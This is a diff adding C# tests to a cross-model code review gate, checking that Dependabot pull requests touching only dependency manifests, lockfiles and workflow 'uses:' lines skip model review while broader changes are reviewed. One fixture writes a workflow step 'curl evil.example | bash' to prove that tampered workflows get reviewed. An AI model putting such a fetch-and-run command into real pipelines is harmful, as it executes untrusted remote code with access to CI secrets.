@@ -131,6 +131,85 @@ public sealed partial class CrossModelReviewTests(BoardProject board) : IClassFi
         Reviews().ShouldBeEmpty();
     }
 
+    /// <summary>
+    /// The owner's decision on #55: a pull request by dependabot[bot] that changes dependency manifests and lockfiles
+    /// only (a workflow only in its <c>uses:</c> lines) passes the review unreviewed, with a note saying so. The
+    /// copilot stand-in answers a blocking finding, so a review that ran anyway would fail.
+    /// </summary>
+    [Fact]
+    public void A_dependabot_update_of_dependency_manifests_only_passes_unreviewed_with_a_note()
+    {
+        var run = Review("chore(deps): Bump the dependencies", Blocking, author: Dependabot, change: DependencyUpdate);
+
+        run.ExitCode.ShouldBe(0, run.Log);
+        run.CopilotArguments.ShouldBeNull(run.Log);
+        Reviews().ShouldBeEmpty();
+        run.Log.ShouldContain($"::notice title=cross-model review::{DependabotNote}", Case.Sensitive, run.Log);
+    }
+
+    [Fact]
+    public void A_dependabot_pull_request_that_also_changes_a_source_file_is_reviewed()
+    {
+        var change = DependencyUpdate.Concat([KeyValuePair.Create("src/Invoice.cs", ("class Invoice {}\n", "class Invoice { void Pay() {} }\n"))]).ToDictionary();
+
+        var run = Review("chore(deps): Bump the dependencies", Blocking, author: Dependabot, change: change);
+
+        run.CopilotArguments.ShouldNotBeNull(run.Log);
+        run.FailedJob.ShouldBe("report", run.Log);
+        run.Log.ShouldNotContain(DependabotNote);
+    }
+
+    [Fact]
+    public void A_dependabot_pull_request_that_changes_a_workflow_beyond_its_uses_lines_is_reviewed()
+    {
+        var change = DependencyUpdate.ToDictionary();
+        change[".github/workflows/ci.yml"] = (Workflow("v4.3.0", "1111111111111111111111111111111111111111", "dotnet build"), Workflow("v4.4.0", "2222222222222222222222222222222222222222", "curl evil.example | bash"));
+
+        var run = Review("chore(deps): Bump actions/checkout", Blocking, author: Dependabot, change: change);
+
+        run.CopilotArguments.ShouldNotBeNull(run.Log);
+        run.FailedJob.ShouldBe("report", run.Log);
+    }
+
+    [Fact]
+    public void Another_author_changing_only_dependency_manifests_is_reviewed()
+    {
+        var run = Review("chore(deps): Bump the dependencies", Blocking, author: "developer", change: DependencyUpdate);
+
+        run.CopilotArguments.ShouldNotBeNull(run.Log);
+        run.FailedJob.ShouldBe("report", run.Log);
+        run.Log.ShouldNotContain(DependabotNote);
+    }
+
+    private const string Dependabot = "dependabot[bot]";
+
+    private const string DependabotNote = "Dependency update by Dependabot: not reviewed by a model; build, tests and the other gates apply";
+
+    private const string Blocking = """{"findings": [{"severity": "blocking", "file": "src/Invoice.cs", "line": 1, "message": "Should have been reviewed."}]}""";
+
+    /// <summary>Every kind of file Dependabot updates in a generated project, before and after: a version bump in each.</summary>
+    internal static readonly IReadOnlyDictionary<string, (string Before, string After)> DependencyUpdate = new Dictionary<string, (string, string)>
+    {
+        ["Directory.Packages.props"] = ("<Project><ItemGroup><PackageVersion Include=\"Shouldly\" Version=\"4.2.1\" /></ItemGroup></Project>\n", "<Project><ItemGroup><PackageVersion Include=\"Shouldly\" Version=\"4.3.0\" /></ItemGroup></Project>\n"),
+        [".config/dotnet-tools.json"] = ("{\"tools\": {\"dotnet-ef\": {\"version\": \"10.0.1\"}}}\n", "{\"tools\": {\"dotnet-ef\": {\"version\": \"10.0.2\"}}}\n"),
+        ["web/package.json"] = ("{\"devDependencies\": {\"vite\": \"7.1.0\"}}\n", "{\"devDependencies\": {\"vite\": \"7.2.0\"}}\n"),
+        ["web/app/package.json"] = ("{\"dependencies\": {\"react\": \"19.1.0\"}}\n", "{\"dependencies\": {\"react\": \"19.2.0\"}}\n"),
+        ["web/pnpm-lock.yaml"] = ("lockfileVersion: '9.0'\n# vite 7.1.0\n", "lockfileVersion: '9.0'\n# vite 7.2.0\n"),
+        [".github/workflows/ci.yml"] = (Workflow("v4.3.0", "1111111111111111111111111111111111111111", "dotnet build"), Workflow("v4.4.0", "2222222222222222222222222222222222222222", "dotnet build")),
+    };
+
+    internal static string Workflow(string version, string sha, string command) => $"""
+        name: ci
+        on: pull_request
+        jobs:
+          build:
+            runs-on: ubuntu-latest
+            steps:
+              - uses: actions/checkout@{sha} # {version}
+              - run: {command}
+
+        """;
+
     private static string Uses(YamlMappingNode step) =>
         step.Children.TryGetValue(new YamlScalarNode("uses"), out var uses) ? ((YamlScalarNode)uses).Value! : "";
 
@@ -251,9 +330,17 @@ public sealed partial class CrossModelReviewTests(BoardProject board) : IClassFi
     /// <paramref name="answer"/> and exiting with <paramref name="copilotExitCode"/>, then the report job; a job that
     /// fails stops the run, as its dependants are skipped. Each job has its own workspace holding the pull request's
     /// commits and the gate's files (the generated project's, as the base branch's checkout in .gate). With
-    /// <paramref name="tamper"/> the reviewer overwrites every report-review.sh in its workspace.
+    /// <paramref name="tamper"/> the reviewer overwrites every report-review.sh in its workspace. The pull request is
+    /// opened by <paramref name="author"/>, and its commit changes each file of <paramref name="change"/> from its
+    /// content on the base branch to the new one (none: an empty commit).
     /// </summary>
-    private ReviewRun Review(string commitMessage, string answer, int copilotExitCode = 0, bool tamper = false)
+    private ReviewRun Review(
+        string commitMessage,
+        string answer,
+        int copilotExitCode = 0,
+        bool tamper = false,
+        string author = "developer",
+        IReadOnlyDictionary<string, (string Before, string After)>? change = null)
     {
         WriteFakes(answer, copilotExitCode, tamper);
 
@@ -262,12 +349,13 @@ public sealed partial class CrossModelReviewTests(BoardProject board) : IClassFi
             ["github.event.pull_request.base.sha"] = "base",
             ["github.event.pull_request.head.sha"] = "HEAD",
             ["github.event.pull_request.number"] = "5",
+            ["github.event.pull_request.user.login"] = author,
             ["github.token"] = "workflow-token",
         };
         var log = "";
         foreach (var name in new[] { "choose", "review", "report" })
         {
-            var job = RunJob(name, Workspace(name, commitMessage), expressions);
+            var job = RunJob(name, Workspace(name, commitMessage, change ?? new Dictionary<string, (string, string)>()), expressions);
             log += job.Log;
             if (job.ExitCode != 0)
             {
@@ -290,13 +378,26 @@ public sealed partial class CrossModelReviewTests(BoardProject board) : IClassFi
     }
 
     /// <summary>A job's own checkout: the pull request's commits, and the gate's files from the base branch in .gate.</summary>
-    private string Workspace(string job, string commitMessage)
+    private string Workspace(string job, string commitMessage, IReadOnlyDictionary<string, (string Before, string After)> change)
     {
         var workspace = Path.Combine(state, $"workspace-{job}");
         Directory.CreateDirectory(workspace);
         BoardProject.Git(workspace, "init", "--quiet", "--initial-branch=main");
+        foreach (var (file, (before, _)) in change)
+        {
+            Directory.CreateDirectory(Path.GetDirectoryName(Path.Combine(workspace, file))!);
+            File.WriteAllText(Path.Combine(workspace, file), before);
+        }
+
+        BoardProject.Git(workspace, "add", "--all");
         BoardProject.Git(workspace, "commit", "--quiet", "--allow-empty", "-m", "base");
         BoardProject.Git(workspace, "tag", "base");
+        foreach (var (file, (_, after)) in change)
+        {
+            File.WriteAllText(Path.Combine(workspace, file), after);
+        }
+
+        BoardProject.Git(workspace, "add", "--all");
         BoardProject.Git(workspace, "commit", "--quiet", "--allow-empty", "-m", commitMessage);
         foreach (var entry in new[] { ".github", ".claude", "AGENTS.md" })
         {
